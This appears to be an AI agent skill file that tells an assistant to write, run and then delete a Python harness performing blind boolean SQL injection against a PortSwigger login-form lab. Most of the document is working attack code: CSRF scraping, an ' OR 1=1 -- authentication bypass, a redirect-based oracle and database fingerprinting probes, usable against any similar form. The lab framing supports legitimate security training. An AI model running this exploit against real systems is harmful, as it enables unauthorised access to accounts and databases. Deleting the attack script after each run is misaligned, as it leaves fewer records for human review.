---
name: sqli-conductor-simplified
description: Conduct a blind boolean-based SQL injection attack against a PortSwigger Web Security Academy login-form lab. Use when the user provides a PortSwigger lab /login URL and asks to perform SQL injection, test for SQL injection, or identify the backend database. Single-file version — the full harness is embedded below, no supporting files needed.
---

# SQL Injection Conductor — Simplified (single-file)

Conduct a **blind boolean-based SQL injection** attack against a PortSwigger
Web Security Academy **login-form** lab end to end. Authorized education: the
only target is the lab URL the user provides.

## Inputs

- `TARGET_URL` — the lab's `/login` URL (required).
- `PARAM_NAME` — injectable field, default `username`.

## The harness

Copy the script below **verbatim** into a file named `sqli_run.py`. Change
**only** `TARGET_URL` (and `PARAM_NAME` if the lab differs). Do not rewrite or
"improve" it — the CSRF handling, HTTP/1.1 transport, redirect oracle, and
OR-based payload are all load-bearing.

```python
import re
import requests

try:
    from urllib3.backend import HttpVersion
    from requests.adapters import HTTPAdapter

    class _H1Adapter(HTTPAdapter):
        """Force HTTP/1.1. The urllib3 hface HTTP/2 backend hangs through some proxies."""
        def init_poolmanager(self, connections, maxsize, block=False, **pool_kwargs):
            pool_kwargs.setdefault("disabled_svn", set()).update({HttpVersion.h2, HttpVersion.h3})
            return super().init_poolmanager(connections, maxsize, block, **pool_kwargs)

    _H1 = _H1Adapter
except Exception:
    _H1 = None

TARGET_URL = "PASTE_TARGET_URL_HERE"
PARAM_NAME = "username"
PASSWORD_FIELD = "password"
DUMMY_PASS = "anything"

_active_session = None
_active_csrf = None

def _refresh_session():
    """Create a new session and fetch its CSRF token."""
    global _active_session, _active_csrf
    _active_session = requests.Session()
    if _H1 is not None:
        _active_session.mount("https://", _H1())
    _active_session.headers.update({"User-Agent": "Mozilla/5.0"})
    r = _active_session.get(TARGET_URL, timeout=10)
    m = re.search(r'name="csrf"\s+value="([^"]+)"', r.text)
    if not m:
        print(f"[!] CSRF not found. Status: {r.status_code}")
        return False
    _active_csrf = m.group(1)
    return True

def send_request(payload):
    """POST the payload as the username field. Returns the response or None."""
    global _active_session, _active_csrf
    if _active_session is None or _active_csrf is None:
        if not _refresh_session():
            return None
    data = {PARAM_NAME: payload, PASSWORD_FIELD: DUMMY_PASS, "csrf": _active_csrf}
    try:
        resp = _active_session.post(TARGET_URL, data=data, timeout=10, allow_redirects=False)
    except Exception as e:
        print(f"[!] Request failed: {type(e).__name__}: {e}")
        _active_session = None
        _active_csrf = None
        return None
    if resp.status_code in (301, 302, 303, 307, 308):
        _active_session = None
        _active_csrf = None
    return resp

def wrap(condition):
    return f"' OR ({condition}) -- "

def auth_bypass():
    return "' OR 1=1 -- "

def is_true(resp):
    """TRUE iff the injection redirected to /my-account."""
    if resp is None:
        return False
    if resp.status_code in (301, 302, 303, 307, 308):
        return "my-account" in resp.headers.get("Location", "")
    return False

PROBES = {
    'mysql':      "/*!500001=1*/",
    'postgresql': "1=CAST((SELECT 1) AS TEXT)",
    'mssql':      "@@version IS NOT NULL",
    'oracle':     "(SELECT 1 FROM DUAL)=1",
}

def detect_dbms():
    """Return the first DBMS whose dialect probe evaluates TRUE."""
    for dbms, probe in PROBES.items():
        resp = send_request(wrap(probe))
        if is_true(resp):
            return dbms
    return 'mysql'

if __name__ == "__main__":
    print(f"[*] Target: {TARGET_URL}")

    print("\n[*] Step 1: Confirming injection with auth bypass...")
    resp = send_request(auth_bypass())
    if is_true(resp):
        print("[+] Auth bypass successful - injection confirmed")
    else:
        print("[-] Auth bypass failed")
        if resp:
            print(f"[-] Status: {resp.status_code}")
            print(f"[-] Location: {resp.headers.get('Location', 'none')}")
        exit()

    print("\n[*] Step 2: Detecting DBMS...")
    dbms = detect_dbms()
    print(f"[+] Detected DBMS: {dbms}")

    print(f"\n[+] Done. Injection confirmed; backend is likely {dbms}.")
```

## Procedure

1. **Write** the script above to `sqli_run.py` with `TARGET_URL` set to the
   lab's `/login` URL.
2. **Run** it: `python3 sqli_run.py`.
3. **Read** the output and report.

## Cleanup

After the run finishes — success **or** failure — delete the generated file:
`rm sqli_run.py`. Do not leave the script behind after the session, and do not
commit it anywhere. If the attack ends early (e.g. auth bypass failed), delete
it immediately after reporting the result.

## Interpretation

- `[+] Auth bypass successful - injection confirmed` → the login form is
  injectable.
- `[+] Detected DBMS: <name>` → backend fingerprint (MySQL/PostgreSQL/MSSQL/Oracle).
- `[-] Auth bypass failed` → wrong/expired lab URL, or the page does not
  contain a `name="csrf"` field. Ask the user for a fresh lab URL.
- Requests hang or time out → the HTTP/1.1 adapter is already in the script;
  verify you copied it. A gateway 504 means the lab instance expired.

## Definition of done

Injection confirmed and DBMS reported, or a clear statement that the target is
not injectable with this technique.
